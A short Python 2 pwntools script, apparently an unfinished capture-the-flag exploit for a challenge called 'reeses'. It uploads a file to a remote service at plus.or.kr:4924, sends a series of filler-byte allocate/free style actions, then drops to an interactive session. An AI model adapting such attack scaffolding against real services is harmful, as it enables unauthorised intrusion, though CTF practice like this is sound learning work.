#!/usr/bin/python
from pwn import *
import os
import sys

DEBUG = True

# target = sys.argv[1]
target = 'sample1'
#p = process('./reeses')

p = remote('plus.or.kr', 4924)
f = open(target, 'rb')

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    print "[*] %s" % response
  return response

def action(actionnum, size, content):
  payload = chr(actionnum)
  payload += p32(size)
  payload += content

  p.send(payload)

p.send(p32(os.path.getsize(target)))
p.send(f.read())

r("<<RUNNING>>\n")

size = 0x10
# content = 'A' * size

action(0, size, 'a' * size)
action(1, size, 'b' * size)

action(0, size, 'c' * size)
action(1, size, 'b' * size)

action(0, size, 'a' * size)
action(1, size, 'D' * size)

p.interactive()
p.close()
